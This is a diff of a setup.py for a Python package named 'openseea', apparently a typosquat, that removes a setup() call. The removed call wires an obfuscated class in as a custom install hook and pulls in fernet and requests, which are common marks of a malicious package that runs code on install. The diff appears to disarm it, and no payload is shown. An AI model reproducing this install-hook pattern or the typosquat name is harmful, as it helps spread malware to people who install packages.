@@ -18,22 +18,5 @@ class JFnJTQXLgNHWetGGPxZzUAHfTTpsWmwGPcrHbtNGWHGhQeexhWVVFzWcXCnrumyQJZeHSLesQf
             install.run(self)
 
 
-setup(
-    name="openseea",
-    version=VERSION,
-    author="SuZJUiJzAkOqaPzY",
-    author_email="lLeMageWJWKK@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': JFnJTQXLgNHWetGGPxZzUAHfTTpsWmwGPcrHbtNGWHGhQeexhWVVFzWcXCnrumyQJZeHSLesQfcYgxzaZdgFWHiwGeMJUUYmsWWiUaZMSFiMcgxjlYVeL,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 
